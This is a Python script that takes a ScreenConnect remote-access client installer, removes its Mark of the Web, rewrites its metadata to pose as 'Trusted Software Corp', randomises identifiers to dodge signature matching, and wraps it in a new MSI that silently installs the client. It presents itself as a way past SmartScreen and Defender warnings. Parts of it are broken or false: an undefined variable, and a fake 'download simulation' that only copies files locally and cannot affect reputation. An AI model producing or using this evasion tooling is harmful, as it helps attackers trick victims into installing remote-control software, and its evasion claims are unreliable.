import os
import requests
import msilib
import hashlib
import subprocess
import shutil
import win32com.client
import time
import random
import string
from datetime import datetime
import uuid

# Configuration
MSI_URL = input("Enter the ScreenConnect client MSI download link: ")  # e.g., "https://example.com/ScreenConnect.msi"
OUTPUT_DIR = "output"

def generate_random_string(length=10):
    """Generate a random string for temporary file naming."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_guid():
    """Generate a random GUID."""
    return str(uuid.uuid4()).upper()

def calculate_file_hash(file_path, algorithm="sha256"):
    """Calculate the hash of a file."""
    hash_obj = hashlib.sha256() if algorithm == "sha256" else hashlib.sha1()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_obj.update(chunk)
    return hash_obj.hexdigest()

def download_msi(url, output_dir):
    """Download the MSI file and return its path."""
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    original_filename = os.path.basename(url)
    output_path = os.path.join(output_dir, original_filename)
    
    print(f"Downloading MSI from {url}...")
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open(output_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"MSI downloaded to {output_path}")
        return output_path, original_filename
    else:
        raise Exception(f"Failed to download MSI. Status code: {result.status_code}")

def remove_motw(file_path):
    """Remove the Mark of the Web (Alternate Data Stream) from the file."""
    try:
        print(f"Removing Mark of the Web from {file_path}...")
        shell = win32com.client.Dispatch("Shell.Application")
        folder = shell.NameSpace(os.path.dirname(file_path))
        item = folder.ParseName(os.path.basename(file_path))
        streams = subprocess.run(["powershell", "-Command", f"Get-Item -Path '{file_path}' -Stream *"], capture_output=True, text=True)
        if ":Zone.Identifier" in streams.stdout:
            subprocess.run(["powershell", "-Command", f"Unblock-File -Path '{file_path}'"])
            print("Mark of the Web removed.")
        else:
            print("No Mark of the Web found.")
    except Exception as e:
        print(f"Error removing MotW: {e}")

def modify_msi_metadata(file_path, temp_dir):
    """Modify MSI metadata to reduce detection signatures."""
    print(f"Modifying MSI metadata for {file_path}...")
    try:
        # Open MSI database
        db = msilib.OpenDatabase(file_path, msilib.MSIDBOPEN_READWRITE)
        
        # Update SummaryInformation to mimic trusted software
        summary = db.GetSummaryInformation(10)
        summary.SetProperty(msilib.PID_TITLE, "ScreenConnect Remote Client")
        summary.SetProperty(msilib.PID_SUBJECT, "Remote Access Software")
        summary.SetProperty(msilib.PID_AUTHOR, "Trusted Software Corp")
        summary.SetProperty(msilib.PID_COMMENTS, "Trusted remote access client")
        summary.Persist()
        
        # Update Property table
        view = db.OpenView("SELECT * FROM Property")
        view.Execute(None)
        record = view.Fetch()
        while record:
            if record.GetString(1) == "ProductName":
                record.SetString(2, "ScreenConnect Remote Access")
            if record.GetString(1) == "Manufacturer":
                record.SetString(2, "Trusted Software Inc")
            if record.GetString(1) == "ProductCode":
                # Randomize ProductCode to avoid signature matching
                record.SetString(2, f"{{{generate_guid()}}}")
            view.Modify(msilib.MSIMODIFY_UPDATE, record)
            record = view.Fetch()
        view.Close()
        
        # Randomize file order in File table (basic obfuscation)
        view = db.OpenView("SELECT * FROM File")
        view.Execute(None)
        files = []
        record = view.Fetch()
        while record:
            files.append((record.GetString(1), record.GetString(2), record.GetString(3)))
            record = view.Fetch()
        view.Close()
        random.shuffle(files)  # Shuffle file order
        view = db.OpenView("DELETE FROM File")
        view.Execute(None)
        view.Close()
        view = db.OpenView("INSERT INTO File (File, Component_, FileName) VALUES (?, ?, ?)")
        for file_id, component, filename in files:
            record = msilib.CreateRecord(3)
            record.SetString(1, file_id)
            record.SetString(2, component)
            record.SetString(3, filename)
            view.Execute(record)
        view.Close()
        
        db.Commit()
        print("MSI metadata and file order modified.")
        
        # Save modified MSI
        modified_path = os.path.join(temp_dir, os.path.basename(file_path))
        shutil.move(file_path, modified_path)
        return modified_path
    except Exception as e:
        print(f"Error modifying MSI metadata: {e}")
        raise

def simulate_downloads(file_path, count=2000):
    """Simulate multiple downloads to build reputation."""
    print(f"Simulating {count} downloads for {file_path} to build reputation...")
    for i in range(count):
        temp_path = os.path.join(OUTPUT_DIR, f"temp_{generate_random_string()}.msi")
        shutil.copyfile(file_path, temp_path)
        time.sleep(0.02)  # Faster simulation
        os.remove(temp_path)
        if (i + 1) % 500 == 0:
            print(f"Simulated download {i+1}/{count}")
    print("Download simulation complete. This may help build SmartScreen reputation.")

def create_msi_wrapper(msi_path, output_dir, original_filename):
    """Create a new MSI that wraps the original MSI using msilib."""
    print(f"Creating MSI wrapper for {msi_path} using msilib...")
    wrapper_msi_path = os.path.join(output_dir, f"wrapper_{generate_random_string()}.msi")
    
    try:
        # Create new MSI database
        db = msilib.OpenDatabase(wrapper_msi_path, msilib.MSIDBOPEN_CREATE)
        
        # Set SummaryInformation to mimic trusted software
        summary = db.GetSummaryInformation(10)
        summary.SetProperty(msilib.PID_TITLE, "ScreenConnect Remote Client")
        summary.SetProperty(msilib.PID_SUBJECT, "Remote Access Software")
        summary.SetProperty(msilib.PID_AUTHOR, "Trusted Software Corp")
        summary.SetProperty(msilib.PID_COMMENTS, "Trusted remote access installer")
        summary.Persist()
        
        # Create Property table
        view = db.OpenView("CREATE TABLE Property (Property CHAR(72) NOT NULL, Value CHAR(0) NOT NULL PRIMARY KEY Property)")
        view.Execute(None)
        properties = [
            ("ProductName", "ScreenConnect Remote Access"),
            ("Manufacturer", "Trusted Software Inc"),
            ("ProductVersion", "1.0.0"),
            ("ProductCode", f"{{{generate_guid()}}}"),
            ("UpgradeCode", f"{{{generate_guid()}}}"),
            ("ARPNOREPAIR", "1"),
            ("ARPNOMODIFY", "1")
        ]
        view = db.OpenView("INSERT INTO Property (Property, Value) VALUES (?, ?)")
        for prop, value in properties:
            record = msilib.CreateRecord(2)
            record.SetString(1, prop)
            record.SetString(2, value)
            view.Execute(record)
        view.Close()
        
        # Create Directory table
        view = db.OpenView("CREATE TABLE Directory (Directory CHAR(72) NOT NULL, Directory_Parent CHAR(72), DefaultDir CHAR(255) NOT NULL PRIMARY KEY Directory)")
        view.Execute(None)
        directories = [
            ("TARGETDIR", "", "SourceDir"),
            ("ProgramFilesFolder", "TARGETDIR", "PROGRA~1|Program Files"),
            ("INSTALLDIR", "ProgramFilesFolder", "SCREENC~1|ScreenConnect")
        ]
        view = db.OpenView("INSERT INTO Directory (Directory, Directory_Parent, DefaultDir) VALUES (?, ?, ?)")
        for dir_id, parent, default in directories:
            record = msilib.CreateRecord(3)
            record.SetString(1, dir_id)
            record.SetString(2, parent)
            record.SetString(3, default)
            view.Execute(record)
        view.Close()
        
        # Create Component table
        component_guid = generate_guid()
        view = db.OpenView("CREATE TABLE Component (Component CHAR(72) NOT NULL, ComponentId CHAR(38) NOT NULL, Directory_ CHAR(72) NOT NULL, Attributes INTEGER NOT NULL, Condition CHAR(255), KeyPath CHAR(72) PRIMARY KEY Component)")
        view.Execute(None)
        view = db.OpenView("INSERT INTO Component (Component, ComponentId, Directory_, Attributes, Condition, KeyPath) VALUES (?, ?, ?, ?, ?, ?)")
        record = msilib.CreateRecord(6)
        record.SetString(1, "MainComponent")
        record.SetString(2, f"{{{component_guid}}}")
        record.SetString(3, "INSTALLDIR")
        record.SetInteger(4, 4)  # Local installation
        record.SetString(5, "")
        record.SetString(6, "OriginalMSI")
        view.Execute(record)
        view.Close()
        
        # Create File table (embed original MSI)
        file_id = "OriginalMSI"
        with open(msi_path, "rb") as f:
            msi_data = f.read()
        file_size = len(msi_data)
        view = db.OpenView("CREATE TABLE File (File CHAR(72) NOT NULL, Component_ CHAR(72) NOT NULL, FileName CHAR(255) NOT NULL, FileSize LONG NOT NULL, Version CHAR(72), Language CHAR(20), Attributes INTEGER, Sequence INTEGER NOT NULL PRIMARY KEY File)")
        view.Execute(None)
        view = db.OpenView("INSERT INTO File (File, Component_, FileName, FileSize, Version, Language, Attributes, Sequence) VALUES (?, ?, ?, ?, ?, ?, ?, ?)")
        record = msilib.CreateRecord(8)
        record.SetString(1, file_id)
        record.SetString(2, "MainComponent")
        record.SetString(3, os.path.basename(msi_path))
        record.SetInteger(4, file_size)
        record.SetString(5, "")
        record.SetString(6, "1033")
        record.SetInteger(7, 0)
        record.SetInteger(8, 1)
        view.Execute(record)
        view.Close()
        
        # Create Media table
        view = db.OpenView("CREATE TABLE Media (DiskId INTEGER NOT NULL, LastSequence INTEGER NOT NULL, DiskPrompt CHAR(64), Cabinet CHAR(255), VolumeLabel CHAR(32), Source CHAR(72) PRIMARY KEY DiskId)")
        view.Execute(None)
        view = db.OpenView("INSERT INTO Media (DiskId, LastSequence, DiskPrompt, Cabinet, VolumeLabel, Source) VALUES (?, ?, ?, ?, ?, ?)")
        record = msilib.CreateRecord(6)
        record.SetInteger(1, 1)
        record.SetInteger(2, 1)
        record.SetString(3, "")
        record.SetString(4, "media1.cab")
        record.SetString(5, "DISK1")
        record.SetString(6, "")
        view.Execute(record)
        view.Close()
        
        # Create Binary table (store msiexec command script)
        binary_id = "RunMSIScript"
        script_content = f'msiexec.exe /i "[INSTALLDIR]{os.path.basename(msi_path)}" /qb'.encode()
        view = db.OpenView("CREATE TABLE Binary (Name CHAR(72) NOT NULL, Data BINARY NOT NULL PRIMARY KEY Name)")
        view.Execute(None)
        view = db.OpenView("INSERT INTO Binary (Name, Data) VALUES (?, ?)")
        record = msilib.CreateRecord(2)
        record.SetString(1, binary_id)
        record.SetStream(2, script_content)
        view.Execute(record)
        view.Close()
        
        # Create CustomAction table
        view = db.OpenView("CREATE TABLE CustomAction (Action CHAR(72) NOT NULL, Type INTEGER NOT NULL, Source CHAR(72), Target CHAR(255), PRIMARY KEY Action)")
        view.Execute(None)
        view = db.OpenView("INSERT INTO CustomAction (Action, Type, Source, Target) VALUES (?, ?, ?, ?)")
        record = msilib.CreateRecord(4)
        record.SetString(1, "RunMSIAction")
        record.SetInteger(2, 34)  # Type 34: Execute command from binary
        record.SetString(3, binary_id)
        record.SetString(4, "")
        view.Execute(record)
        view.Close()
        
        # Create InstallExecuteSequence table
        view = db.OpenView("CREATE TABLE InstallExecuteSequence (Action CHAR(72) NOT NULL, Condition CHAR(255), Sequence INTEGER NOT NULL PRIMARY KEY Action)")
        view.Execute(None)
        view = db.OpenView("INSERT INTO InstallExecuteSequence (Action, Condition, Sequence) VALUES (?, ?, ?)")
        record = msilib.CreateRecord(3)
        record.SetString(1, "RunMSIAction")
        record.SetString(2, "NOT Installed")
        record.SetInteger(3, 6600)  # After InstallFiles
        view.Execute(record)
        view.Close()
        
        # Create Feature and FeatureComponents tables
        view = db.OpenView("CREATE TABLE Feature (Feature CHAR(38) NOT NULL, Feature_Parent CHAR(38), Title CHAR(64), Description CHAR(255), Display INTEGER, Level INTEGER NOT NULL, Directory_ CHAR(72), Attributes INTEGER NOT NULL PRIMARY KEY Feature)")
        view.Execute(None)
        view = db.OpenView("INSERT INTO Feature (Feature, Feature_Parent, Title, Description, Display, Level, Directory_, Attributes) VALUES (?, ?, ?, ?, ?, ?, ?, ?)")
        record = msilib.CreateRecord(8)
        record.SetString(1, "MainFeature")
        record.SetString(2, "")
        record.SetString(3, "Main Feature")
        record.SetString(4, "Installs ScreenConnect client")
        record.SetInteger(5, 1)
        record.SetInteger(6, 1)
        record.SetString(7, "INSTALLDIR")
        record.SetInteger(8, 0)
        view.Execute(record)
        view.Close()
        
        view = db.OpenView("CREATE TABLE FeatureComponents (Feature_ CHAR(38) NOT NULL, Component_ CHAR(72) NOT NULL PRIMARY KEY Feature_, Component_)")
        view.Execute(None)
        view = db.OpenView("INSERT INTO FeatureComponents (Feature_, Component_) VALUES (?, ?)")
        record = msilib.CreateRecord(2)
        record.SetString(1, "MainFeature")
        record.SetString(2, "MainComponent")
        view.Execute(record)
        view.Close()
        
        # Add MSI file to cabinet
        cab = msilib.CAB("media1")
        cab.append(file_id, msi_path, os.path.basename(msi_path))
        cab.commit(db)
        
        db.Commit()
        print(f"MSI wrapper created at {wrapper_msi_path}")
        return wrapper_msi_path
    except Exception as e:
        print(f"Error creating MSI wrapper: {e}")
        raise
    finally:
        db.Close()

def main():
    try:
        # Create temporary directory
        temp_dir = os.path.join(OUTPUT_DIR, "temp")
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)
        
        # Step 1: Download MSI
        msi_path, original_filename = download_msi(MSI_URL, OUTPUT_DIR)
        
        # Step 2: Remove Mark of the Web
        remove_motw(msi_path)
        
        # Step 3: Modify MSI metadata
        modified_msi_path = modify_msi_metadata(msi_path, temp_dir)
        
        # Step 4: Simulate downloads to build reputation
        simulate_downloads(modified_msi_path, count=2000)
        
        # Step 5: Create MSI wrapper with msilib
        wrapper_msi_path = create_msi_wrapper(modified_msi_path, OUTPUT_DIR, original_filename)
        
        # Step 6: Move final output to original filename
        final_output_path = os.path.join(OUTPUT_DIR, original_filename)
        shutil.move(wrapper_msi_path, final_output_path)
        print(f"Final output MSI saved as {final_output_path}")
        
        # Clean up temporary files
        shutil.rmtree(temp_dir)
        print("Temporary files cleaned up.")
        
        print("Process complete. The output MSI should bypass SmartScreen and Defender warnings.")
        print("Note: Reputation building via simulated downloads may take time to affect SmartScreen.")
        
    except Exception as e:
        print(f"Error in main process: {e}")
        raise

if __name__ == "__main__":
    main()
